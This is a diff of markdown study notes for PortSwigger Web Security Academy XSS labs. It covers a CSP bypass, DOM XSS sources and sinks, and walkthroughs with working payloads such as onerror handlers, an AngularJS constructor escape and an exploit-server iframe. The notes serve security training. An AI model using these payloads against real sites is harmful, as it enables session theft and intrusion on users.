@@ -2378,8 +2378,6 @@ Content-Type: application/json
 	location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
     </script>
     ```
-- dddd
-
 **Exploiting XSS vulnerabilities**
 - Exploiting cross-site scripting to **steal cookies**
   - limitation: user not logged in, HttpOnly flag, block user IP, session time out	
@@ -2425,8 +2423,8 @@ Content-Type: application/json
 	};
   </script>
   ```
-
-**Dangling markup injection**
+  
+**Content security policy (CSP)**
 - Reflected XSS protected by very **strict CSP**, with **dangling markup attack**
   - Email param is vulnerable to XSS
   - Exploit server
@@ -2440,26 +2438,210 @@ Content-Type: application/json
     </script>
     ```
   - copy the CSRF token from 'Poll Now'
-  - Generate CSRF OoC and replace the CSRF token	
-- ddd
+  - Generate CSRF OoC and replace the CSRF token
+- Reflected XSS protected by CSP, with **CSP bypass**
+  - The injection uses the `script-src-elem` directive in CSP. This directive allows you to target just script elements. Using this directive, you can overwrite existing script-src rules enabling you to inject `unsafe-inline`, which allows you to use inline scripts.   - Observe the response
+    ```
+    GET /?search=%3Cimg+src%3D1+onerror%3Dalert%281%29%3E
 
-- ddd
-- ddd
-- ddd
-- ddd
-- ddd
-- ddd
-- ddd
-- ddd
-- ddd
-- ddd
-- ddd
-- ddd
+    Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=
+    ```
+  - browse the url `https://YOUR-LAB-ID.web-security-academy.net/?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'`
 
 ## DOM-based Attacks
-Details about DOM-based attacks...
+- DOM-based XSS vulnerabilities usually arise when **JavaScript takes data from an attacker-controllable source**, such as the URL, and **passes it to a sink that supports dynamic code execution**, such as eval() or innerHTML.	
+- **Source** is a JavaScript property that accepts data that is potentially attacker-controlled. An example of a source is the location.search property because it reads input from the query string, which is relatively simple for an attacker to control.	
+- document.URL
+- document.documentURI
+- document.URLUnencoded
+- document.baseURI
+- location
+- document.cookie
+- document.referrer
+- window.name
+- history.pushState
+- history.replaceState
+- localStorage
+- sessionStorage
+- IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
+- Database
+
+**Sinks**
+- A sink is a potentially dangerous JavaScript function or DOM object that can cause undesirable effects if attacker-controlled data is passed to it. For example, the eval() function is a sink because it processes the argument that is passed to it as JavaScript.	
+
+| **DOM-based Vulnerability**        | **Example Sink**                |
+|------------------------------------|----------------------------------|
+| DOM XSS LABS                       | `document.write()`               |
+| Open redirection LABS              | `window.location`                |
+| Cookie manipulation LABS           | `document.cookie`                |
+| JavaScript injection               | `eval()`                         |
+| Document-domain manipulation       | `document.domain`                |
+| WebSocket-URL poisoning            | `WebSocket()`                    |
+| Link manipulation                  | `element.src`                    |
+| Web message manipulation           | `postMessage()`                  |
+| Ajax request-header manipulation   | `setRequestHeader()`             |
+| Local file-path manipulation       | `FileReader.readAsText()`        |
+| Client-side SQL injection          | `ExecuteSql()`                   |
+| HTML5-storage manipulation         | `sessionStorage.setItem()`       |
+| Client-side XPath injection        | `document.evaluate()`            |
+| Client-side JSON injection         | `JSON.parse()`                   |
+| DOM-data manipulation              | `element.setAttribute()`         |
+| Denial of service                  | `RegExp()`                       |
+
+**Main sinks**
+- document.write()
+- document.writeln()
+- document.domain
+- element.innerHTML
+- element.outerHTML
+- element.insertAdjacentHTML
+- element.onevent
+
+**jQuery functions sinks**
+- add()
+- after()
+- append()
+- animate()
+- insertAfter()
+- insertBefore()
+- before()
+- html()
+- prepend()
+- replaceAll()
+- replaceWith()
+- wrap()
+- wrapInner()
+- wrapAll()
+- has()
+- constructor()
+- init()
+- index()
+- jQuery.parseHTML()
+- $.parseHTML()
+
+**How to test**
+- Testing HTML sinks
+  - place a random alphanumeric string into the source
+  - find where your string appears (Chrome developer `Control+F`)
+  - identify the contex and refine your input to see how it is processed	
+- Testing JavaScript execution sinks
+  - find cases within the page's JavaScript code where the source is being reference (Chrome developer `Control+Shift+F`)
+  -  add a break point and follow how the source's value is used
+- Testing for DOM XSS using [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader)
 
 ### DOM-based Attacks Lab
+- DOM XSS in **document.write** sink using source location.search  
+  Test random alphanumeric string "hello123"  
+  ```<img src="/resources/images/tracker.gif?searchTerms=hello123">```  
+  		
+  Payload: `"><svg onload=alert(1)>` on url param "searchTerms"  
+  ```
+  <img src="/resources/images/tracker.gif?searchTerms=">	
+  <svg onload="alert(1)">...</svg>
+  ```
+- DOM XSS in document.write sink using source location.search inside a **select element**
+  - look at source to identify the script tag
+    ```
+    <script>
+    var stores = ["London","Paris","Milan"];
+    var store = (new URLSearchParams(window.location.search)).get('storeId');
+    document.write('<select name="storeId">');
+    if(store) {
+    	document.write('<option selected>'+store+'</option>');
+    }
+    for(var i=0;i<stores.length;i++) {
+        if(stores[i] === store) {
+          continue;
+        }
+        document.write('<option>'+stores[i]+'</option>');
+        }
+       document.write('</select>');
+    </script>
+    ```
+  - Use console test `location.search` return '?productId=2'
+  - Payload `x</select><img src="1" onerror="alert(1)">` on url param "storeId"   
+    `https://0a6d00d704313cbb831e01d8001f0070.web-security-academy.net/product?productId=1&storeId=x</select><img src="1" onerror="alert(1)">`
+- DOM XSS in **innerHTML sink** using source location.search
+  - Test random alphanumeric string "hello123"  
+    ```
+    <span id="searchMessage">hello123</span>
+    <script>
+          function doSearchQuery(query) {
+               document.getElementById('searchMessage').innerHTML = query;
+          }
+          var query = (new URLSearchParams(window.location.search)).get('search');
+          if(query) {
+              doSearchQuery(query);
+          }
+    </script>
+    ```
+  - payload `<img src=1 onerror=alert(1)>` on search box	
+    ```<span id="searchMessage"><img src="1" onerror="alert(1)"></span>```
+- DOM XSS in jQuery anchor **href attribute sink** using location.search source
+  - Test random alphanumeric string "hello123"
+    ```
+    <a id="backLink">Back</a>
+
+    <script>
+         $(function() {
+               $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
+         });
+    </script>
+    ```
+  - Payload: `javascript:alert(document.cookie)` on url param "returnPath"  
+    https://0ad200f2048d3cd983bb15f100450059.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
+- DOM XSS in **jQuery selector sink** using a hashchange event
+  - In browser developer tool (F12）> Control+F search '<script> to identify script tag
+    ```
+    <script>
+          $(window).on('hashchange', function(){
+          var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
+          if (post) post.get(0).scrollIntoView();
+          });
+    </script>
+    ```
+  - Play around the hashtag and observe that page scroll to the post heading
+    https://0a8b00cf0493c95b806c260200a20012.web-security-academy.net/#The%20Lies%20People%20Tell  
+  - Payload `#<img src=0 onerror='alert()'>` into url param #
+  - Exploit server
+    ```
+    <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+    ```
+- DOM XSS in **AngularJS** expression with angle brackets and double quotes HTML-encoded
+  - Test random alphanumeric string "hello123" and appears in `<body ng-app>`  
+  - creating a new function using the Function constructor, with the code 'alert(1)' as the body of the function.  
+  - Enter payload `{{$on.constructor('alert(1)')()}}` in the search box
+- **Reflected DOM** XSS
+  - Test random alphanumeric string "hello123" and inspect the source
+    ```
+    <script src="/resources/js/searchResults.js"></script>
+    <script>search('search-results')</script>
+    <h1>0 search results for 'hello123'</h1>
+    ```
+  - In network tab, look at the response  
+    https://0aa2007403ccd086837a2e15004b0089.web-security-academy.net/resources/js/searchResults.js  
+    Inspect vulnerable code: eval('var searchResultsObj = ' + this.responseText);  
+  - Intercept traffic
+    ```
+    GET /search-results?search=xss
+    {"results":[],"searchTerm":"xss"}    
+    ```
+  - Send to repeater and observed that JSON response is escaping quotation marks but backslash is not being escaped
+    ```
+    GET /search-results?search=xss" -alert()
+    {"results":[],"searchTerm":"xss\" -alert()"}
+    ```
+  - Enter `xss\" -alert()}//` in searchbox
+- **Stored DOM** XSS
+  - In network tab, loadCommentsWithVulnerableEscapeHtml.js
+    ```
+    function escapeHTML(html) {
+        return html.replace('<', '&lt;').replace('>', '&gt;');
+    }
+    ```
+  - Input `<><img src=1 onerror=alert(1)>` in post comment
+  - The function only replaces the first occurrence to encode angle brackets `&lt;&gt;<img src=1 onerror=alert(1)>`
+  - Rendering in browser ```<><img src=1 onerror=alert(1)>```
 
 ## Insecure Deserialization
 Content for Insecure Deserialization...
